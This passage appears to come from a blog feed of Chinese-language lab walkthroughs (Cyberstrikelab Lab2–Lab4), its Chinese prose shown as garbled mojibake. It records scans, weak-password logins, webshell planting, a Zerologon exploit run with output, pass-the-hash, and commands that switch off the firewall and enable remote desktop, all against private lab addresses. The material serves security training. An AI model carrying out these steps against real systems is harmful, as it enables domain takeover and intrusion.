http://192.168.20.20:7001/console/login/LoginForm.jsp\n[-] [192.168.20.20:7001] Weblogic UDDI module default path does not exist!\n[-] [192.168.20.20:7001] weblogic not detected CVE-2016-0638\n[-] [192.168.20.20:7001] weblogic not detected CVE-2016-3510\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-10271\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3248\n[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3506\n[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2628\n[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2893\n[+] [192.168.20.20:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2894\n[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2725\n[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2890\n[*] =========Task E n d=========\n```\n\næ²¡æœ‰è´¦æˆ·ï¼Œæ²¡æ³•æ‰“\n\n![image.png](/post-images/CyberstrikelabLab4/image9.png)\n\n## 192.168.20.30\n\n### ä¿¡æ¯æ”¶é›†\n\nè¿™é‡Œå…ˆæ‰“ `192.168.20.30`\n\nä»ä¸Šé¢æ‰«æä¸­èƒ½çŸ¥é“ï¼Œè¿™æ˜¯ `DC` \n\nå…ˆå°è¯•æšä¸¾ä¸€æ³¢\n\n```php\nâœ  Tools proxychains nxc smb 192.168.20.30 -u anonymous -p ''\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:135  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) \n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\\anonymous: STATUS_LOGON_FAILURE \n```\n\n![image.png](/post-images/CyberstrikelabLab4/image10.png)\n\nå¹¶æ²¡æœ‰æšä¸¾å‡ºæ¥ä»€ä¹ˆ\n\n### Zerologon\n\nè¿™é‡Œå†è¯•è¯• `zerologon`\n\n```php\nâœ  CVE-2020-1472-tester git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n================================================================\nSuccess! DC can be fully compromised by a Zerologon attack.\n```\n\nè¿˜çœŸæœ‰ï¼Œæ‰“ `exp`\n\n```php\nâœ  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n==================================================\nTarget vulnerable, changing account password to empty string\n\nResult: 0\n\nExploit complete!\n```\n\nDumphash\n\n![image.png](/post-images/CyberstrikelabLab4/image11.png)\n\n`PTH` æ‹¿ `flag3`\n\n![image.png](/post-images/CyberstrikelabLab4/image12.png)\n\n## 192.168.20.20 - 2\n\nä»æ‰«æç»“æœçœ‹ï¼Œ`192.168.20.20`ä¹Ÿæ˜¯åŸŸå†…ä¸»æœºï¼Œä¹Ÿæ˜¯ç›´æ¥ `PTH`\n\n![image.png](/post-images/CyberstrikelabLab4/image13.png)\n\nè¯» flag2\n\n```php\nC:\\Windows\\system32> type C:\\flag.txt\ngo-flag{yJzuQ09FXn0h7Em4}\n```",
            "url": "https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4",
            "title": "Cyberstrikelab - Lab4",
            "summary": "Lab4 https://www.cyberstrikelab.com/#/scene/detail/23 Recon å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ 5820 æ˜¯ WebæœåŠ¡ 192.168.10.10 BlueCMS æ­å»ºç€çš„æ˜¯ BlueCMS åœ¨é¡µè„šä¸­èƒ½æ‰¾åˆ°æ˜¯ï¼šPowered by BlueCMS v1....",
            "date_modified": "2025-08-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Cyberstrikelab",
                "Windows",
                "blueCMS",
                "å¤šå±‚å†…ç½‘",
                "zerologon"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3",
            "content_html": "\n# Lab3\n\n> https://www.cyberstrikelab.com/#/scene/detail/22\n> \n\n## Recon\n\næç¤º `192.168.10.0` ç½‘æ®µ\n\n```php\nâœ  Lab3 nmap -sn 192.168.10.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:42 CST\nNmap scan report for 192.168.10.10\nHost is up (0.053s latency).\nNmap scan report for 192.168.10.233\nHost is up (0.075s latency).\nNmap done: 256 IP addresses (2 hosts up) scanned in 18.25 seconds\n```\n\næ‰«æå‡ºæ¥ `192.168.10.10`\n\n```php\nâœ  Lab3 nmap -sT -min-rate 5000 -p- 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:43 CST\nNmap scan report for 192.168.10.10\nHost is up (0.050s latency).\nNot shown: 65522 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3306/tcp  open  mysql\n3590/tcp  open  wv-csp-sms\n5040/tcp  open  unknown\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 18.63 seconds\n```\n\n`HTTP` ç«¯å£åœ¨`3590`\n\n```php\nâœ  Lab3 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:44 CST\nNmap scan report for 192.168.10.10\nHost is up (0.054s latency).\n                                                \nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                             \n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  \n445/tcp   open  microsoft-ds?\n3306/tcp  open  mysql         MySQL (unauthorized)\n3590/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n|_http-title:  taoCMS\\xE6\\xBC\\x94\\xE7\\xA4\\xBA\n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n5040/tcp  open  unknown\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 21H2 (92%), M\nicrosoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%\n)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -8h00m00s                                                                         \n| smb2-security-mode:                                                                           \n|   3:1:1:                                                                                      \n|_    Message signing enabled but not required                                                  \n| smb2-time:                                                                                    \n|   date: 2025-08-12T05:47:37                                                                   \n|_  start_date: N/A                                                                             \n                                                                                                                                                                                                \nTRACEROUTE (using proto 1/icmp)                                                                                                                                                                 \nHOP RTT      ADDRESS                                                                                                                                                                            \n1   50.73 ms 172.16.233.1\n2   50.81 ms 192.168.10.10                                                                      \n                                                \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 178.96 seconds\n```\n\n## 192.168.10.10\n\n### taoCMS\n\nè®¿é—® `Web` ç«™ç‚¹\n\n![image.png](/post-images/CyberstrikelabLab3/image.png)\n\nå¯»æ‰¾å…¬å¼€æ¼æ´\n\n> https://blog.csdn.net/2302_82189125/article/details/140086872\n> \n\nä½¿ç”¨é»˜è®¤è´¦å·å¯†ç æˆåŠŸè¿›å»äº†\n\n![image.png](/post-images/CyberstrikelabLab3/image1.png)\n\næ¥åˆ°æ–‡ä»¶ç®¡ç†é¡µé¢ï¼Œæ–°å»ºæ–‡ä»¶\n\n![image.png](/post-images/CyberstrikelabLab3/image2.png)\n\nç‚¹å‡»ç¼–è¾‘å†™é©¬å­è¿›å»å°±è¡Œäº†\n\n![image.png](/post-images/CyberstrikelabLab3/image3.png)\n\n`system` æƒé™\n\n![image.png](/post-images/CyberstrikelabLab3/image4.png)\n\nç›´æ¥ä¸Š `Vshell` ï¼Œé¦–å…ˆå…³é—­é˜²ç«å¢™å’Œå¼€å¯è¿œç¨‹æ¡Œé¢\n\n![image.png](/post-images/CyberstrikelabLab3/image5.png)\n\né€šè¿‡ä¸€é”®ä¸Šçº¿å‘½ä»¤\n\n![image.png](/post-images/CyberstrikelabLab3/image6.png)\n\n### ä¿¡æ¯æ”¶é›†\n\nè¯»å– `flag1`\n\n```php\nC:\\phpstudy_pro\\WWW>type C:\\flag.txt\ngo-flag{IpbKNIOigmnsuwY3}\n```\n\næŸ¥çœ‹ç½‘æ®µä¿¡æ¯\n\n```php\nC:\\phpstudy_pro\\WWW>ipconfig\n\nWindows IP é…ç½®\n\nä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:\n\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::81e3:1433:2412:22d8%17\n   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10\n   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0\n   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233\n\nä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0 2:\n\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::edc1:3601:4f28:7fc4%11\n   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.20.10\n   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0\n   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.20.1\n```\n\nå­˜åœ¨ `192.168.20.0` ç½‘æ®µï¼ŒåŠ ä¸Š `flag` çš„æç¤º\n\n![image.png](/post-images/CyberstrikelabLab3/image7.png)\n\nä¸Šä¼  `fscan` æ‰«æï¼Œå…ˆæ‰“ `192.168.20.20`\n\n## 192.168.20.20\n\n### ä¿¡æ¯æ”¶é›†\n\n`fscan` æ‰«æï¼Œ`8055` æ˜¯ `web` æœåŠ¡\n\n```php\nC:\\>fscan -h 192.168.20.20 -nobr -p 1-65535\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-08-12 14:31:40] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-08-12 14:31:40] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-08-12 14:31:40] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-08-12 14:31:40] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-08-12 14:31:40] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 65535\n[2025-08-12 14:31:45] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135\n[2025-08-12 14:31:45] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139\n[2025-08-12 14:31:50] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]\n[2025-08-12 14:31:57] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445\n[2025-08-12 14:32:02] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 => \n[2025-08-12 14:32:50] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 => \n[2025-08-12 14:33:43] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:3306\n[2025-08-12 14:33:43] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:3306 => [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed\nto connect to this MySQL server]\n[2025-08-12 14:35:13] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:5985\n[2025-08-12 14:35:19] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:5985 => [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows\n[2025-08-12 14:36:24] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:8055\n[2025-08-12 14:36:35] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:8055 => [http]\n```\n\né€šè¿‡ `Vshell` è®¾ç½® `socks` ä»£ç†ï¼Œç„¶åç»™ `yakit` è®¾ç½®ä¸‹æ¸¸ä»£ç†å³å¯è®¿é—®\n\n![image.png](/post-images/CyberstrikelabLab3/image8.png)\n\næ˜¯ `thinkphp`ï¼Œæç¤ºè¯´è¢«æ¸—é€è¿‡äº†\n\nè¿™é‡Œæ‰«æäº†ä¸€æ³¢æ²¡æ‰«æå‡ºæ¥ï¼Œå¯èƒ½ç½‘ç«™è¢«æŒ‚é©¬äº†ï¼Œçˆ†ç ´ä¸€ä¸‹\n\nè¿™é‡Œå°è¯•äº†ä½¿ç”¨ `ffuf` å’Œ `wfuzz` æ¥è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯å¹¶ä¸ç†æƒ³\n\n### **awBruter**\n\nçœ‹äº†ä¸€ä¸‹ `WP` ï¼Œæ˜¯é€šè¿‡ `awBruter` æ¥çˆ†ç ´ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç  `admin123`\n\n![image.png](/post-images/CyberstrikelabLab3/image9.png)\n\nèšå‰‘è¿æ¥\n\n![image.png](/post-images/CyberstrikelabLab3/image10.png)\n\nè¢«æŒ‚é©¬çš„åœ°æ–¹ï¼š\n\n![image.png](/post-images/CyberstrikelabLab3/image11.png)\n\næŸ¥çœ‹æƒé™\n\n![image.png](/post-images/CyberstrikelabLab3/image12.png)\n\nè¯»å– `flag2`\n\n```php\nC:\\> type flag.txt\ngo-flag{C2AoW93mioh5XYQg}\n```\n\nä¸Šçº¿æœ‰ç‚¹éº»çƒ¦å°±ç®—äº†ï¼Œé€šè¿‡ `stowaway` æˆ–è€… `chisel` å¼„ä¸€ä¸ªç«¯å£æ˜ å°„å°±è¡Œ\n\n## 192.168.20.30\n\n### ä¿¡æ¯æ”¶é›†\n\né€šè¿‡ `192.168.20.20` èƒ½çŸ¥é“ `192.168.20.30` å°±æ˜¯ `DC`\n\n![image.png](/post-images/CyberstrikelabLab3/image13.png)\n\n`fscan` æ‰«æ\n\n```php\nC:\\>fscan.exe -h 192.168.20.30 -nobr\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-08-12 15:21:41] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-08-12 15:21:41] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-08-12 15:21:41] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-08-12 15:21:42] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-08-12 15:21:42] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445\n[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389\n[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139\n[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135\n[2025-08-12 15:21:42] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88\n[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 => \n[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]\n[2025-08-12 15:21:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 => \n[2025-08-12 15:21:52] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 => \n[2025-08-12 15:22:47] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 => \n[2025-08-12 15:22:47] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 5\n[2025-08-12 15:22:47] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-08-12 15:22:47] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 15:22:47] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.30\nä¸»æœºå: WIN-7NRTJO59O7N\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.20.30\n[2025-08-12 15:22:48] [SUCCESS] æ‰«æå·²å®Œæˆ: 9/9\n```\n\nå°è¯• `SMB` åŒ¿å\n\n```php\nâœ  fscan proxychains -q nxc smb 192.168.20.30 -u anonymous -p ''\nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) \nSMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\\anonymous: STATUS_LOGON_FAILURE\n```\n\næ²¡ä»€ä¹ˆå‘ç°çš„ï¼Œå°è¯•ä¸€ä¸‹å…¬å¼€æ¼æ´ï¼Œæµ‹è¯•ä¸€ä¸‹ `zerologon`\n\n### zerologon\n\n> POCï¼šhttps://github.com/SecuraBV/CVE-2020-1472\n> \n\n```php\nâœ  CVE-2020-1472 git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n==============================================================================\nSuccess! DC can be fully compromised by a Zerologon attack\n```\n\nå†åˆ©ç”¨ exp\n\n> https://github.com/dirkjanm/CVE-2020-1472\n> \n\n```php\nâœ  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30\nPerforming authentication attempts...\n=====================================================================================================================================\nTarget vulnerable, changing account password to empty string\n\nResult: 0\n\nExploit complete!\n```\n\nç„¶åç›´æ¥ `Dumphash`\n\n![image.png](/post-images/CyberstrikelabLab3/image14.png)\n\n`PTH`\n\n![image.png](/post-images/CyberstrikelabLab3/image15.png)\n\nè¯»å– flag\n\n```php\nC:\\Windows\\system32> type C:\\flag.txt\ngo-flag{ueoJt7eB6AQL8OpL}\n```",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3",
            "title": "Cyberstrikelab - Lab3",
            "summary": "Lab3 https://www.cyberstrikelab.com/#/scene/detail/22 Recon æç¤º 192.168.10.0 ç½‘æ®µ æ‰«æå‡ºæ¥ 192.168.10.10 HTTP ç«¯å£åœ¨3590 192.168.10.10 taoCMS è®¿é—® Web ç«™ç‚¹ å¯»æ‰¾å…¬å¼€æ¼æ´ h...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Cyberstrikelab",
                "Windows",
                "taoCMS",
                "å¤šå±‚å†…ç½‘",
                "zerologon"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2",
            "content_html": "\n# Lab2\n\n> https://www.cyberstrikelab.com/#/scene/detail/21\n> \n\n## 192.168.10.10\n\n### Recon\n\nç«¯å£æ‰«æ\n\n```php\nâœ  Lab2 nmap -sT -min-rate 5000 -p- 192.168.10.10                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:36 CST\nNmap scan report for 192.168.10.10\nHost is up (0.053s latency).\nNot shown: 65521 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n808/tcp   open  ccproxy-http\n3306/tcp  open  mysql\n5040/tcp  open  unknown\n7680/tcp  open  pando-pub\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 14.64 seconds\n```\n\n`808` æ˜¯ `web` æœåŠ¡\n\n```php\nâœ  Lab2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:37 CST\nStats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 92.86% done; ETC: 18:40 (0:00:10 remaining)\nNmap scan report for 192.168.10.10\nHost is up (0.054s latency).\n\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n808/tcp   open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n|_http-title: \\xE9\\xAA\\x91\\xE5\\xA3\\xABPHP\\xE9\\xAB\\x98\\xE7\\xAB\\xAF\\xE4\\xBA\\xBA\\xE6\\x89\\x8D\\xE7\\xB3\\xBB\\xE7\\xBB\\x9F(www.74cms.com)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n3306/tcp  open  mysql         MySQL (unauthorized)\n5040/tcp  open  unknown\n7680/tcp  open  pando-pub?\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2025-08-12T02:40:41\n|_  start_date: N/A\n|_clock-skew: -8h00m00s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   53.19 ms 172.16.233.1\n2   53.32 ms 192.168.10.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 181.60 seconds\n```\n\n### éª‘å£« CMS\n\nè®¿é—® `808` ç«¯å£\n\n![image.png](/post-images/CyberstrikelabLab2/image.png)\n\nåœ¨é¡µå°¾ä¸­èƒ½æ‰¾åˆ° `Powered by 74cms v4.2.111` \n\né€šè¿‡æœå¯»ï¼Œå­˜åœ¨åå° `getshell` \n\nå…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨å¼±å¯†ç ï¼Œåå°é¡µé¢ï¼š`http://192.168.10.10:808/index.php?m=admin&c=index&a=login`\n\né€šè¿‡å¼±å¯†ç  `admin`:`admin123456` è¿›å…¥åå°\n\n![image.png](/post-images/CyberstrikelabLab2/image1.png)\n\n> åˆ©ç”¨é“¾æ¥ï¼šhttps://blog.csdn.net/m0_63253040/article/details/127041028\n> \n\n![image.png](/post-images/CyberstrikelabLab2/image2.png)\n\nç„¶åè®¿é—® `/Application/Home/Conf/config.php`\n\n![image.png](/post-images/CyberstrikelabLab2/image3.png)\n\nåå¼¹ `shell`\n\n![image.png](/post-images/CyberstrikelabLab2/image4.png)\n\n![image.png](/post-images/CyberstrikelabLab2/image5.png)\n\nä¸Šçº¿ `Vshell` \n\né¦–å…ˆå°†é˜²ç«å¢™å’Œè¿œç¨‹æ¡Œé¢æ‰“å¼€\n\n```php\nPS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\nThe operation completed successfully.\n\nPS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> netsh advfirewall set allprofiles state off\nOk.\n```\n\né€šè¿‡ä¸€é”®ä¸Šçº¿å‘½ä»¤ä¸Šçº¿ï¼Œä¼ `payload` ä¹Ÿå¯ä»¥\n\n![image.png](/post-images/CyberstrikelabLab2/image6.png)\n\n### ä¿¡æ¯æ”¶é›†\n\nè¯»å–ç¬¬ä¸€ä¸ª `flag.txt`\n\n```php\nC:\\>type flag.txt\ngo-flag{MP9E4xXhya0TlzVF}\n```\n\n`IP` ä¿¡æ¯ï¼Œå¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªç½‘ç»œ\n\n```php\nC:\\>ipconfig\n\nWindows IP é…ç½®\n\nä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:\n\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::81d8:7722:88a0:5578%12\n   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10\n   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0\n   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233\n```\n\næˆ‘ä¹ˆå¯¹ç½‘æ®µæ®µè¿›è¡Œæ‰«æï¼Œå­˜åœ¨ä¸‰å°æœºå­\n\n```php\nâœ  Lab2 nmap -sn 192.168.10.0/24                                                          \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 19:01 CST\nNmap scan report for 192.168.10.10\nHost is up (0.056s latency).\nNmap scan report for 192.168.10.20\nHost is up (0.058s latency).\nNmap scan report for 192.168.10.233\nHost is up (0.061s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 7.37 